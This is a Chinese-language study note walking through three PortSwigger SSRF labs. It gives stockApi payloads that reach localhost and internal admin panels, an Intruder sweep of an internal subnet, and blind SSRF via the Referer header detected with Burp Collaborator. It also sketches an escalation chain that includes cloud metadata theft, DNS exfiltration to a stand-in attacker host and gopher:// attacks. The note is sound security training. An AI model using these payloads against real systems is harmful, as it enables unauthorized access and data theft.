# 2026-09-12(续) PortSwigger SSRF 前三关实战 + Collaborator 带外探测认知

> 状态：✅ 实操过（Lab 1-3 通关）
> 关联：[[PortSwigger-Lab-做题进度]] · [PortSwigger XSS 实战前七题](./2026-09-12-PortSwigger-XSS实战前七题.md)
> 模块：SSRF 共 7 关，今天通了前 3 关（回显型 ×2 + 盲打型 ×1）

## 一、三观一览

| # | Lab | 形态 | 注入点 | 我怎么判断打中了 |
|---|-----|------|--------|-----------------|
| 1 | Basic SSRF against the local server | 回显型（打本机） | POST /product/stock 的 `stockApi` 参数 | **看响应**：返回了本机 `/admin` 的 HTML |
| 2 | Basic SSRF against another back-end system | 回显型（打内网） | 同上 `stockApi` | 扫描时某条返回 **200**，响应里有内网 admin 界面 |
| 3 | Blind SSRF with out-of-band detection | **盲打**（不回显） | **请求头 `Referer`** | **看带外**：Collaborator 里出现 DNS + HTTP，来源 IP 是靶场的 |

> 一句话记住三关的递进：**回显 → 回显但目标在内网 → 压根不回显（换成带外信号）**。

## 二、Lab 1 / Lab 2：回显型 SSRF

### 题目与原理

站点有"库存检查"功能：前端把 `stockApi` 的值交给**服务端**，由服务端去请求那个地址（真实站点里这种"服务端代你访问 URL"的功能到处都是：URL 预览/分享卡片、PDF 生成、头像抓取、Webhook、数据导入）。

**漏洞本质**：服务端把**用户可控的输入**当 URL 去发起请求 —— 这就是 SSRF。

```
POST /product/stock HTTP/2
Content-Type: application/x-www-form-urlencoded

stockApi=%2Fproduct%2Fstock%2Fcheck%3FproductId%3D1%26storeId%3D1   ← 值本身就是个 URL/路径
```

### 过程

**Lab 1（打本机）**

```
① stockApi = http://localhost/admin      → 服务端从本机拿到 admin 面板 HTML
   （我的浏览器直接访问 /admin 是被拦的，但"从本机来的请求"被当成可信来源 → 越权）
② 从返回 HTML 里读出删除用户的链接：http://localhost/admin/delete?username=carlos
③ stockApi = http://localhost/admin/delete?username=carlos  → carlos 被删 = 过关
```

**Lab 2（打内网后端）**

```
① stockApi = http://192.168.0.1:8080/admin
② 把最后一个八位组设成 Intruder 的 §位置§，Payload type = Numbers，1→255，Step 1
③ 按状态码排序 → 只有一条 200 = 内网那台 admin
④ 改路径为 /admin/delete?username=carlos → 过关
```

> 认知：内网系统通常"网络拓扑挡着、自身认证反而弱"，所以只要能借服务端的手摸到它们，往往**不需要认证**就能操作。

## 三、Lab 3：盲打 SSRF（这关我卡最久）

### 题目

站点用分析统计软件：**商品页加载时，服务端会去请求请求头 `Referer` 里的那个地址**。

### 为什么"没有明显的功能点"

因为注入点**在请求头里，不在页面功能里**；而且服务端抓回来的内容**不回显给我**。所以这关的观察对象从"看响应"变成"**看有没有人来看我**"。

```
① 我：把商品页请求的 Referer 改成 https://abc123.oastify.com/
        （浏览器/Repeater 发出去）
                 ▼
② 靶场服务器：analytics 读到 Referer → 拿它去请求
        ├─ DNS 解析 abc123.oastify.com ──→ Collaborator DNS 服务器   ✍ 记一笔
        └─ HTTP GET /  (服务端自己的 UA) ─→ Collaborator Web 服务器   ✍ 记一笔
                 ▼
③ 我：Burp → Collaborator → Poll now → 看到 DNS + HTTP，来源 IP 是靶场的
```

**为什么铃响就证明是 SSRF**：我**没让**我的浏览器去访问那个域（我的浏览器只访问了靶场）；记录里的来源 IP 是**靶场的**；那个域只出现在我改的请求头里。⇒ 只可能是**服务端拿着我给的地址发了请求**。

### 过程

```
1. 打开商品页 → 抓那条 GET /product?productId=1 的文档请求 → Send to Repeater
2. 选中 Referer 值里的【域名那一段】→ 右键 → Insert Collaborator payload
   （先选中再点，否则它插到别处；也可以先在 Collaborator 标签 Copy to clipboard 再手抄替换）
3. Send → Collaborator 标签 → Poll now（异步，等几秒再 poll）
4. 出现 DNS + HTTP（Source IP = 靶场）= 靶场横幅出现 Congratulations = 过关
```

### 踩坑（都是真踩的）

| 坑 | 现象 | 原因 |
|---|---|---|
| **Referer 没换域** | Collaborator 一直空白 | 值还是靶场自己的域名 → 服务端去请求**它自己**，跟我的 Collaborator 毫无关系 |
| 改了非商品页的请求 | 空白 | 分析代码只在**商品页加载**时触发 |
| 自测污染记录 | 分不清是不是靶场打的 | 我自己访问 payload 域也会产生记录 → 看 **Source IP / UA** 区分，或换个新域重做 |
| Collaborator 出网不通 | 空白 | 先**自测通路**：自己浏览器访问 payload 域 → Poll now，连自己的记录都没有 = Burp 到 Collaborator 服务器不通（国内网络/代理问题，需配上游代理） |
| 用了私有 Collaborator | 空白 | 官方 Note：lab 防火墙**只放行默认公共 Collaborator 服务器**（`*.oastify.com`） |

> 排错顺序永远是：**先自测通路（自己制造一次交互）→ 再查投递点对不对**。

## 四、Collaborator 到底是什么（带外探测 OOB）

**一句话**：Burp 官方托管的一台**公网服务器 + 一个记录面板**，专门接收"目标那边偷偷发出来的请求"。

| 组成 | 作用 |
|---|---|
| **唯一子域名** | 形如 `abc123xyz.oastify.com`（老域 `burpcollaborator.net`）；**每个域唯一** → 能区分是"哪一次注入"把服务端引过来的 |
| **DNS + HTTP 服务** | Burp 官方运营；任何人（包括靶场服务端）解析或访问它都会被登记 |
| **Burp 里的 Collaborator 标签** | "取件口"：Poll now 拉记录 → 看来源 IP / 时间 / 路径 / UA |

**四步套路**（所有盲打题通用）：`① 生成域 → ② 投递进漏洞点 → ③ 目标解析/访问 → ④ Poll 取件`

**三条带外通道对比**：

| 通道 | 能观测到什么 | 适用场景 |
|---|---|---|
| **DNS** | 只有"有人解析了这个域"（看不到内容），但**最灵敏、最先到** | 出网被卡到只剩 DNS 时的唯一信号 |
| **HTTP** | 路径 / UA / 请求头 → **可以夹带数据出去** | 目标能正常出 HTTP |
| **自建 VPS / exploit server** | 日志完全归我控制 | 真实项目；PortSwigger 部分题（XXE 盲打用 exploit server） |

## 五、方法论沉淀

**盲打 SSRF 三问自检**：

1. **谁在发请求？** —— 必须确认是服务端（不是我的浏览器）；
2. **我给的地址会到哪去？** —— 决定它能打多远：本机 `127.0.0.1` → 内网 `192.168/10.x` → 云元数据 `169.254.169.254`；
3. **我怎么知道它去了？** —— 回显（看响应）/ 带外（Collaborator）/ 时间差（盲注式探测）。

**找 SSRF 注入点的特征**：参数或请求头的**值本身长得像 URL / 域名 / 路径 / IP**（`stockApi` `url` `dest` `redirect` `callback` `webhook`…；头：`Referer` `User-Agent` `X-Forwarded-For` `Host`）。

**现实里的隐形入口**：PDF/截图生成、URL 预览与分享卡片、头像/图片 URL 抓取、Webhook、数据导入、埋点上报。

**危害链（为什么盲打也值钱）**：扫内网 → 打无认证内网服务 → 取**云元数据凭证**接管云账号（真实案例：2019 Capital One SSRF 打 AWS 元数据 → 一亿多用户数据泄露）→ DNS 带外偷数据（`<secret>.attacker.com`）→ `gopher://` 打 Redis/FastCGI 升级 RCE。

## 待实践

- SSRF 4-7：黑名单绕过（换 `127.0.0.1` 的各种等价写法）· 开放重定向绕过 · Shellshock 盲打 · 白名单绕过
- Lab 2 我自己 Intruder 的具体字典/结果截图待补

## 关联笔记

- [PortSwigger XSS 实战前七题](./2026-09-12-PortSwigger-XSS实战前七题.md)
- [靶场进度 PortSwigger-Lab-做题进度.md](./PortSwigger-Lab-做题进度.md)
- [CSRF 与 SSRF 漏洞详解](./2026-08-04-CSRF与SSRF漏洞详解.md)

> ⚠️ 声明：仅限授权环境（靶场/CTF/授权渗透）中测试。
